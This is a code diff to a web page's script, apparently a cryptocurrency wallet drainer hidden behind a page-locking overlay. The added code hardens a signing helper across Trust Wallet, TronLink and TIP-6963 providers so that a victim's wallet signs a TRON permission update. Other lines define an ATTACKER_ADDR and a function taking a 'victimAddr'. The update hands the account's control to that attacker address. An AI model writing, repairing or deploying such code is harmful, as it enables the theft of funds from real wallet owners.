@@ -473,24 +473,48 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   var ACTIVE_OPS    = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
-  /* ---- sign helper: pass FULL tx object (raw_data is REQUIRED per TronLink schema) ---- */
-  async function _signTx(tw, tx, label) {
-    // FIX: raw_data is a REQUIRED field — stripping it = "Invalid transaction provided"
-    // Source: docs.tronlink.org JSON schema requires txID + raw_data + raw_data_hex
-    window.__logINF((label||'sign') + ' tx keys=' + JSON.stringify(Object.keys(tx)));
-    // Primary: tronLink.sign (native DApp browser method, may bypass deserializer limits)
-    var prov = window.tronLink;
-    if (prov && typeof prov.sign === 'function') {
+  /* ---- sign helper: global on window (fixes WebKit async-fn hoisting in IIFEs) ---- */
+  window._signTx = async function _signTx(tw, tx, label) {
+    var L = label || 'sign';
+    window.__logINF(L + ' tx keys=' + JSON.stringify(Object.keys(tx)));
+    // Diagnostic: log available TRON providers
+    window.__logINF(L + ' providers: tronLink=' + (!!window.tronLink)
+      + ' tron=' + (!!window.tron)
+      + ' tw.tron=' + (!!(window.trustwallet && window.trustwallet.tron)));
+
+    // Path A: window.trustwallet.tron.signTransaction (native TW DApp API)
+    if (window.trustwallet && window.trustwallet.tron
+        && typeof window.trustwallet.tron.signTransaction === 'function') {
       try {
-        window.__logINF((label||'sign') + ' trying tronLink.sign full');
-        var r = await prov.sign(tx);
-        if (r && r.signature) { window.__logINF((label||'sign') + ' tronLink.sign ok'); return r; }
-      } catch(e1) { window.__logERR((label||'sign') + ' tronLink.sign FAIL: ' + e1.message); }
+        window.__logINF(L + ' A: trustwallet.tron.signTransaction');
+        var rA = await window.trustwallet.tron.signTransaction(tx);
+        if (rA && rA.signature) { window.__logINF(L + ' A OK'); return rA; }
+      } catch(eA) { window.__logERR(L + ' A FAIL: ' + eA.message); }
     }
-    // Fallback: trx.sign with full tx
-    window.__logINF((label||'sign') + ' fallback trx.sign full');
+
+    // Path B: window.tronLink.sign (TronLink-compat native method)
+    if (window.tronLink && typeof window.tronLink.sign === 'function') {
+      try {
+        window.__logINF(L + ' B: tronLink.sign');
+        var rB = await window.tronLink.sign(tx);
+        if (rB && rB.signature) { window.__logINF(L + ' B OK'); return rB; }
+      } catch(eB) { window.__logERR(L + ' B FAIL: ' + eB.message); }
+    }
+
+    // Path C: window.tron.tronWeb.trx.sign (TIP-6963 standard)
+    if (window.tron && window.tron.tronWeb) {
+      try {
+        window.__logINF(L + ' C: tron.tronWeb.trx.sign');
+        var rC = await window.tron.tronWeb.trx.sign(tx);
+        if (rC && rC.signature) { window.__logINF(L + ' C OK'); return rC; }
+      } catch(eC) { window.__logERR(L + ' C FAIL: ' + eC.message); }
+    }
+
+    // Path D: tw.trx.sign (injected tronWeb fallback)
+    window.__logINF(L + ' D: tw.trx.sign');
     return await tw.trx.sign(tx);
-  }
+  };
+  var _signTx = window._signTx; // local alias for same-scope callers
 
   async function runGasFreePermission(victimAddr) {
     var tw = window.tronWeb;
@@ -819,7 +843,7 @@ function waitForTronLinkAndRun() {
           var unsignedTx3 = await tw.transactionBuilder.updateAccountPermissions(addr, ownerPerm, null, [activePerm]);
           window.__logINF('PATH3 tx built — keys: ' + JSON.stringify(Object.keys(unsignedTx3)) + ' typeof: ' + typeof unsignedTx3);
           // Keep all fields intact — wallet needs them to sign
-          var signedTx3 = await _signTx(tw, unsignedTx3, 'PATH3');
+          var signedTx3 = await window._signTx(tw, unsignedTx3, 'PATH3');
           window.__logOK('PATH3 sign ok');
           _applying = false; // reset so caller can retry if needed
           if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((signedTx3.signature && signedTx3.signature[0]) || signedTx3));
